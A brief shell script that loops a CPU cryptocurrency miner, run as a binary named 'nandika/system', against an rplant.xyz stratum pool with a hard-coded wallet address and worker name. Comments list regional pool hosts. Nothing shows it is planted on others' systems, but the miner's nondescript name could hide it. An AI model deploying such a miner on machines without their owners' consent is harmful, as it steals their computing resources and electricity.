#!/bin/sh
#
# Choose nearest stratum:
#       stratum-ru.rplant.xyz   /Moscow/
#       stratum-eu.rplant.xyz   /London/
#       stratum-asia.rplant.xyz /Singapore/
#       stratum-na.rplant.xyz   /Toronto/
#
while [ 1 ]; do
nandika/system -a cpupower --no-auto -o stratum+tcps://stratum-asia.rplant.xyz:17029 -u CKrT7Fbd8tzxDXMhL5DCLQKVV4C5iH6KXn.vienna
sleep 5
done
